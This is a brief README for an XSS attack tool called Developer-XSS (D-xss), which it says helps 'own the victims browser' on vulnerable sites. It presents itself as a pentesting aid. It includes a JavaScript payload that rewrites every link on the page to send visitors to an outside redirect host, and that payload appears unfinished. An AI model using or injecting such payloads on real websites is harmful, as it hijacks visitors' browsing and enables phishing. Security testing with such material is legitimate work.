# Developer-XSS
Developers xss is named as D-xss which is our python programming tool that helps to own the victims browser with given payload and can execute malicious javascript  if the site is vulnerable to cross site scripting attack
This tool helps the pentester or developer for finding the xss bug.

js payload for redirecting :
var anchors = document.getElementsByTagName("a");for (var i = 0; i < anchors.length; i++) {
    anchors[i].href = "http://www.mysite.com/?redirect=" 
}
